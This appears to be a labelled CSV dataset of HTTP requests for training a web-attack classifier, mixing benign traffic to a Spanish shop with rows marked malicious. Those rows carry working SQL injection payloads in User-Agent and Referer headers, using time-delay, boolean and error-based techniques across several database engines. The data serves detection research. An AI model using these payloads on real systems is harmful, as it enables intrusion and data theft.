method,url,uri,query,headers,body,type
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -5807))) OR (SELECT (CASE WHEN (7877=6939) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7877) END) FROM DUAL) IS NULL AND (((3083=3083
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E6FE7B2BDC0F83966A94EC3487AFA420,errorMsg=Credenciales+incorrectas,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AS zvMI WHERE 7097=7097 AND (SELECT (CASE WHEN (5451=7580) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5451) END) FROM DUAL) IS NULL-- Zepf
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' IN BOOLEAN MODE) AND 8692=7178%16
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/')) OR SLEEP(5) AND (('VSzz' LIKE 'VSzz
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -7960'))) OR (SELECT (CASE WHEN (4348=4348) THEN NULL ELSE CAST((CHR(116)||CHR(82)||CHR(111)||CHR(102)) AS NUMERIC) END)) IS NULL AND ((('eGnA' LIKE 'eGnA
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=8EC5DE20AAA90D443784F3CA25C542DB,id=2,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' OR CHAR(99)||CHAR(113)||CHAR(121)||CHAR(113)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8885),0),5000000000),NULL) AND 'MUkR' LIKE 'MUkR
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/3.gif,/tienda1/imagenes/3.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D7F65545F2B62A822783134756058499,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) AND 6914=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (('KHGu'='KHGu
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=76F77B965B498A6EB848A9A4A8071785,modo=entrar&login=vilas&pwd=GeNiTorio&remember=on&B1=Entrar,benign
GET,/tienda1/imagenes/logo.gif,/tienda1/imagenes/logo.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=CF63AC09572B67E1F4444E840483F296,,benign
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D5B85AC57A18EA6F6123072A92050187,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' IN BOOLEAN MODE) AND 5772=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/carrito.jsp,/tienda1/publico/carrito.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=35BA48FB4012B065DB0541D0FFA19FAA,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/') AND 5019=(SELECT COUNT(fuzzBits(char(73)||char(109)||char(84)||char(76), 0.001)) FROM numbers(1000000))-- mqnt
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FD9A8CE6978F18F32E45D0E889865E51,modo=entrar&login=croxford&pwd=salv%E1tico&remember=off&B1=Entrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' OR 4483=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) OR 'vxyM'='BHsY
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/'))) AND ELT(8897=5638,5638) AND ((('FnFY' LIKE 'FnFY
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/ogono.jpg,/tienda1/miembros/imagenes/ogono.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=ABC3F894021EE5101B42AB8498BD5EEE,,benign
POST,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A86CA20B851F5CDE4CB5614BBA5B0F7F,modo=registro&login=heleen&password=tR50D8R&nombre=Polia&apellidos=Manso+Vivanco&email=belbin%40hipotecascom.im&dni=16408383E&direccion=Farell+100%2C+&ciudad=Puras&cp=09339&provincia=Soria&ntc=5443956095123158&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/')) AND SLEEP(5)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=681F10A4BB57CEC30A4A8593DDCD52C3,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"" AND 1906=(SELECT 1906 FROM PG_SLEEP(5)) AND ""ZtNz"" LIKE ""ZtNz
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/) AND MAKE_SET(3709=4218,4218) AND (4740=4740
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,modo=insertar&precio=548&B1=Confirmar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=51DD7750E270752B1FF3C860DAD9E37B,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: -6386' OR (SELECT (CASE WHEN (1669=1168) THEN NULL ELSE CAST((CHR(89)||CHR(105)||CHR(109)||CHR(122)) AS NUMERIC) END)) IS NULL-- WQJh
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/) AS CuDx WHERE 4028=4028 OR 2932=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- WYZK
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' WHERE 4367=4367 OR SLEEP(5)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,modo=registro&login=kungchia&password=opalino&nombre=Claro&apellidos=Olivares+Jull%E1&email=benny%40lawn.ph&dni=39890773X&direccion=Paseo+Rinconada%2C+29+4%3FB&ciudad=V%EDcar&cp=23230&provincia=Zamora&ntc=6914714938050640&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=ED9AED20B72B6486DF89B133893EAB9F,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) OR ELT(9099=9099,SLEEP(5)) AND (('VkDh'='VkDh
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -5232 OR CASE WHEN 7236=7236 THEN 7236 ELSE JSON(CHAR(113,73,86,69)) END
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -1959%' OR (SELECT (CASE WHEN (5623=1713) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5623) END) FROM DUAL) IS NULL AND 'aaxi%'='aaxi
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/2.gif,/tienda1/imagenes/2.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=307E16DD2296F3CA0C3E54A51A1DA18A,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/) RLIKE SLEEP(5)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/global/creditos.jsp,/tienda1/global/creditos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=2B1DE3642F7463460534834266B188F6,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/,(SELECT (CASE WHEN (2213=6639) THEN 1 ELSE 2213*(SELECT 2213 FROM INFORMATION_SCHEMA.PLUGINS) END))
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/ WHERE 7142=7142 OR 6253=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- hgPQ
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,modo=registro&login=landers&password=t5Ie%F1A%3FL&nombre=Natasha&apellidos=Jover&email=stern%40unidadesdeventilacion.jm&dni=32194904X&direccion=Calle+Saltonas%2C+73+&ciudad=Benasal&cp=09613&provincia=Salamanca&ntc=0632335269364731&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FA0AC42232C188956DAA508607650F4B,,benign
GET,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A56A67E7ADE41A5A556AD94A5213C0E1,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -1841') AS RTkP WHERE 6261=6261 OR (SELECT (CASE WHEN (5466=4115) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5466) END) FROM DUAL) IS NULL-- bbgz
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=gallard&pwd=3r70e0t463d*1&remember=on&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=4B4C94599F08063270EA6F1094950D73,,benign
GET,/tienda1/global/estilos.css,/tienda1/global/estilos.css,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=782AD0A0FC008A81D4C5CFE9FBFDFE5B,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"")) OR SLEEP(5) AND ((""OnvD"" LIKE ""OnvD
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/zarauz.jpg,/tienda1/miembros/imagenes/zarauz.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=3FE676BF09F25D20826BBB94F9B5E9E6,,benign
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=60F9F9139EBA94B175024D438D608149,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5') OR SLEEP(5) AND ('QhqO'='QhqO
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -4210')) OR 4454=4454#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -9499%' OR 8994=3631 AND 'QuGK%'='QuGK
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) AND 3114=(SELECT COUNT(fuzzBits(char(106)||char(67)||char(82)||char(86), 0.001)) FROM numbers(1000000)) AND (('wbiu' LIKE 'wbiu
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/) WHERE 6800=6800 AND (SELECT 7812 FROM (SELECT(SLEEP(5)))yGge)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/2.gif,/tienda1/imagenes/2.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=AEE58053E32F434FC4499F51D1EEB900,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A0EFAC2BD1248F2BBDE34F08C97E29B1,modo=insertar&precio=2250&B1=Pasar+por+caja,benign
GET,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=557296F688E818B1471B13AF16D66D3A,,benign
GET,/tienda1/miembros/imagenes/zarauz.jpg,/tienda1/miembros/imagenes/zarauz.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=53BD168135CAAD34ED28C0BA8359543B,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) WHERE 5181=5181 OR 3984=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))-- eKFb
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/))) HAVING 4599=3648 AND (((1364=1364
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/""))) AND 5772=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND (((""LoAh""=""LoAh
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5` WHERE 6303=6303 WAITFOR DELAY '0:0:5'--
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/productos.jsp,/tienda1/publico/productos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=9316F50134C314F4926A8BDBE1A0D404,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"")) OR 6739=(SELECT 6739 FROM PG_SLEEP(5)) AND ((""TlPT""=""TlPT
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"" AND 6953=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ""vqID"" LIKE ""vqID
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5 HAVING 3321=1365
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=8D6C1BCEFCE94B5E8FF81C780E0D648F,id=2&nombre=Queso+Manchego&precio=85&cantidad=82&B1=A%F1adir+al+carrito,benign
